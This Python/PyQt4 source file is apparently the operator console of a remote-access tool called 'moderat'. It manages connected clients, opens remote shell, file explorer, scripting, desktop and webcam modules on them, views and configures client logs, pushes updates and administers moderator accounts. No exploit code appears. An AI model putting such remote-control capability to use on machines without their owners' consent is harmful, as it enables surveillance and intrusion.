from PyQt4.QtGui import *
import os
import string
import random

from libs.language import Translate
from libs.gui import main
from libs.moderat import Clients
from libs.moderat.Decorators import *
from libs.log_settings import LogSettings
from LogViewer import LogViewer

from modules.mexplorer import main as mexplorer
from modules.mshell import main as mshell
from modules.mscript import main as mscript
from modules.mdesktop import main as mdesktop
from modules.mwebcam import main as mwebcam


# Multi Lang
translate = Translate()
_ = lambda _word: translate.word(_word)


def id_generator(size=16, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


class Actions:
    def __init__(self, moderat):
        self.moderat = moderat
        self.clients = Clients.Clients(self.moderat)

        # Create Main UI Functions
        self.ui = main.updateUi(self.moderat)
        self.ui.disable_administrator()

    def login(self):
        '''
        login to server
        :return:
        '''
        self.moderat.session_id = id_generator(size=24)
        username, ok = QInputDialog.getText(self.moderat, _('LOG_IN_TITLE'), _('LOG_IN_USERNAME'), QLineEdit.Normal)
        if ok:
            password, ok = QInputDialog.getText(self.moderat, _('LOG_IN_TITLE'), _('LOG_IN_PASSWORD'),
                                                QLineEdit.Password)
            if ok:
                self.moderat.moderator.send_msg('auth %s %s' % (username, password), 'moderatorInitializing',
                                                session_id=self.moderat.session_id)
            else:
                self.ui.on_moderator_connected()
        else:
            self.ui.on_moderator_not_connected()

    def disconnect(self):
        '''
        disconnected from server
        :return:
        '''
        # Stop Clients Checker
        if self.moderat.clients_checker:
            if self.moderat.clients_checker.isActive():
                self.moderat.clients_checker.stop()
        # Stop Moderators Checker
        if self.moderat.moderators_checker:
            if self.moderat.moderators_checker.isActive():
                self.moderat.moderators_checker.stop()
        # Stop Connection
        try:
            self.moderat.connection.disconnect()
        except AttributeError:
            pass
        # Update GUI
        self.ui.on_moderator_not_connected()
        self.ui.clear_tables()

        self.ui.disable_administrator()

    def get_clients(self):
        self.moderat.moderator.send_msg(message='getClients', mode='getClients', session_id=self.moderat.session_id)

    @client_is_selected
    def set_alias(self):
        '''
        Set Alias For Client
        :return:
        '''
        for client_args in self.current_client():
            client, alias, ip_address = client_args
            if client:
                text, ok = QInputDialog.getText(self.moderat, _('ALIAS_SET'), _('ALIAS_NAME'))
                if ok:
                    unicode_text = unicode(text)
                    self.moderat.moderator.send_msg('%s %s' % (client, unicode_text), 'setAlias',
                                                    session_id=self.moderat.session_id)

    @client_is_selected
    def remove_client(self):
        for client_args in self.current_client():
            client, alias, ip_address = client_args
            if client:
                reply = QMessageBox.question(self.moderat, _('ADMINISTRATION_QUESTION_REMOVE'), _('ADMINISTRATION_QUESTION_REMOVE'), QMessageBox.Yes, QMessageBox.No)
                if reply == QMessageBox.Yes:
                    self.moderat.moderator.send_msg('%s' % client, 'removeClient', session_id=self.moderat.session_id)

    @client_is_selected
    def log_viewer(self):
        for client_args in self.current_client():
            client, alias, ip_address = client_args
            if client:
                module_id = id_generator()
                client_config = {
                        'moderator':    self.moderat.moderator,
                        'moderat':      self.moderat,
                        'client':       client,
                        'alias':        alias,
                        'ip_address':   ip_address,
                        'os':           os,
                        'session_id':   self.moderat.session_id,
                        'assets':       self.moderat.assets,
                        'module_id':    module_id,
                }
                self.moderat.logViewers[module_id] = LogViewer(client_config)
                self.moderat.logViewers[module_id].show()

    @client_is_selected
    def set_log_settings(self):
        self.settings_windows = {}
        for client_args in self.current_client():
            client, alias, ip_address = client_args
            if client:
                module_id = id_generator()
                client_config = self.clients.get_client(client)
                client_config['moderator'] = self.moderat.moderator
                client_config['client'] = client
                client_config['alias'] = alias
                client_config['ip_address'] = ip_address
                client_config['session_id'] = self.moderat.assets
                client_config['assets'] = self.moderat.assets
                self.settings_windows[module_id] = LogSettings(client_config)
                self.settings_windows[module_id].show()

    @client_is_selected
    def update_source(self):
        for client_args in self.current_client():
            client, alias, ip_address = client_args
            if client:
                self.moderat.moderator.send_msg('updateSource', 'updateSource', session_id=self.moderat.session_id, _to=client, module_id='')

    @client_is_selected
    def execute_module(self, module):
        modules = {
            'shell': mshell,
            'explorer': mexplorer,
            'scripting': mscript,
            'desktop': mdesktop,
            'webcam': mwebcam,
        }

        for client_args in self.current_client():
            client, alias, ip_address = client_args
            if client:
                module_id = id_generator()
                args = {
                    'moderator': self.moderat.moderator,
                    'client': client,
                    'alias': alias,
                    'ip_address': ip_address,
                    'session_id': self.moderat.session_id,
                    'assets': self.moderat.assets,
                    'plugins': self.moderat.plugins,
                    'plugins_dir': self.moderat.plugins_dir,
                    'module_id': module_id,
                }
                if module in modules:
                    self.moderat.modulesBank[module_id] = modules[module].mainPopup(args)
                    self.moderat.modulesBank[module_id].show()

    def current_client(self):
        tab_index = self.moderat.clientsTabs.currentIndex()
        if tab_index == 0:
            selected_rows = sorted(self.moderat.clientsTable.selectionModel().selectedRows())
            payload = []
            for index in selected_rows:
                try:
                    payload.append((
                        str(self.moderat.clientsTable.item(index.row(), 3).text()),
                        unicode(self.moderat.clientsTable.item(index.row(), 2).text()),
                        str(self.moderat.clientsTable.item(index.row(), 1).text()),
                    ))
                except AttributeError:
                    pass
            return payload
        elif tab_index == 1:
            selected_rows = sorted(self.moderat.offlineClientsTable.selectionModel().selectedRows())
            payload = []
            for index in selected_rows:
                try:
                    payload.append((
                        str(self.moderat.offlineClientsTable.item(index.row(), 1).text()),
                        unicode(self.moderat.offlineClientsTable.item(index.row(), 2).text()),
                        str(self.moderat.offlineClientsTable.item(index.row(), 3).text()),
                    ))
                except AttributeError:
                    pass
            return payload
        elif tab_index == 2:
            selected_rows = sorted(self.moderat.moderatorsTable.selectionModel().selectedRows())
            payload = []
            for index in selected_rows:
                try:
                    payload.append(str(self.moderat.moderatorsTable.item(self.moderat.moderatorsTable.currentRow(), 0).text()))
                except AttributeError:
                    pass
            return payload

    def close_moderat(self):
        # Stop Clients Checker
        if self.moderat.clients_checker:
            if self.moderat.clients_checker.isActive():
                self.moderat.clients_checker.stop()
        # Stop Moderators Checker
        if self.moderat.moderators_checker:
            if self.moderat.moderators_checker.isActive():
                self.moderat.moderators_checker.stop()

    # Administrators
    @client_is_selected
    def administrator_set_moderator(self):
        for client_args in self.current_client():
            client, alias, ip_address = client_args
            if client:
                text, ok = QInputDialog.getText(self.moderat, _('SET_MODERATOR_TITLE'), _('SET_MODERATOR_USERNAME'), QLineEdit.Normal)
                if ok:
                    self.moderat.moderator.send_msg('%s %s' % (client, text), 'setModerator', session_id=self.moderat.session_id, _to=client)

    def administrator_get_moderators(self):
        self.moderat.moderator.send_msg(message='getModerators', mode='getModerators', session_id=self.moderat.session_id)

    def administrator_create_moderator(self):
        # Get Username
        username, ok = QInputDialog.getText(self.moderat, _('ADMINISTRATION_INPUT_USERNAME'), _('ADMINISTRATION_USERNAME'), QLineEdit.Normal)
        if ok and len(str(username)) > 0:
            username = str(username)
            # Get Password
            password, ok = QInputDialog.getText(self.moderat, _('ADMINISTRATION_INPUT_PASSWORD'), _('ADMINISTRATION_PASSWORD'), QLineEdit.Password)
            if ok and len(str(password)) > 3:
                password = str(password)
                # Get Privileges
                privileges, ok = QInputDialog.getItem(self.moderat, _('ADMINISTRATION_INPUT_PRIVS'), _('ADMINISTRATION_PRIVS'), ('0', '1'), 0, False)
                admin = str(privileges)
                if ok and privileges:
                    self.moderat.moderator.send_msg('%s %s %s' % (username, password, admin), 'addModerator', session_id=self.moderat.session_id)
                else:
                    warn = QMessageBox(QMessageBox.Warning, _('ADMINISTRATION_INCORRECT_PRIVILEGES'), _('ADMINISTRATION_INCORRECT_PRIVILEGES'))
                    ans = warn.exec_()
                    return
            else:
                warn = QMessageBox(QMessageBox.Warning, _('ADMINISTRATION_INCORRECT_PASSWORD'), _('ADMINISTRATION_INCORRECT_PASSWORD'))
                ans = warn.exec_()
                return
        else:
            warn = QMessageBox(QMessageBox.Warning, _('ADMINISTRATION_INCORRECT_USERNAME'), _('ADMINISTRATION_INCORRECT_USERNAME'))
            ans = warn.exec_()
            return

    def administrator_change_moderator_password(self):
        for moderator_args in self.current_client():
            moderator = moderator_args
            password, ok = QInputDialog.getText(self.moderat, _('ADMINISTRATION_INPUT_PASSWORD'), _('ADMINISTRATION_PASSWORD'), QLineEdit.Password)
            if ok and len(str(password)) > 3:
                password1 = str(password)
                password, ok = QInputDialog.getText(self.moderat, _('ADMINISTRATION_INPUT_PASSWORD'), _('ADMINISTRATION_PASSWORD'), QLineEdit.Password)
                if ok and len(str(password)) > 3:
                    password2 = str(password)

                    if password1 == password2:
                        self.moderat.moderator.send_msg('%s %s' % (moderator, password1), 'changePassword', session_id=self.moderat.session_id)
                    else:
                        warn = QMessageBox(QMessageBox.Warning, _('ADMINISTRATION_PASSWORD_NOT_MATCH'), _('ADMINISTRATION_PASSWORD_NOT_MATCH'))
                        ans = warn.exec_()
                        return
                # if not password
                else:
                    warn = QMessageBox(QMessageBox.Warning, _('ADMINISTRATION_INCORRECT_PASSWORD'), _('ADMINISTRATION_INCORRECT_PASSWORD'))
                    ans = warn.exec_()
                    return
            else:
                warn = QMessageBox(QMessageBox.Warning, _('ADMINISTRATION_INCORRECT_PASSWORD'), _('ADMINISTRATION_INCORRECT_PASSWORD'))
                ans = warn.exec_()
                return

    def administrator_change_moderator_privilege(self):
        for moderator_args in self.current_client():
            moderator = moderator_args
            privileges, ok = QInputDialog.getItem(self.moderat, _('ADMINISTRATION_INPUT_PRIVS'), _('ADMINISTRATION_PRIVS'),
                                                  ('0', '1'), 0, False)
            admin = str(privileges)
            if ok and privileges:
                self.moderat.moderator.send_msg('%s %s' % (moderator, admin), 'changePrivilege',
                                                session_id=self.moderat.session_id)

    def administrator_remove_moderator(self):
        for moderator_args in self.current_client():
            moderator = moderator_args
            reply = QMessageBox.question(self.moderat, _('ADMINISTRATION_QUESTION_REMOVE'), _('ADMINISTRATION_QUESTION_REMOVE'),
                                          QMessageBox.Yes, QMessageBox.No)
            if reply == QMessageBox.Yes:
                self.moderat.moderator.send_msg('%s' % moderator, 'removeModerator',
                                                session_id=self.moderat.session_id)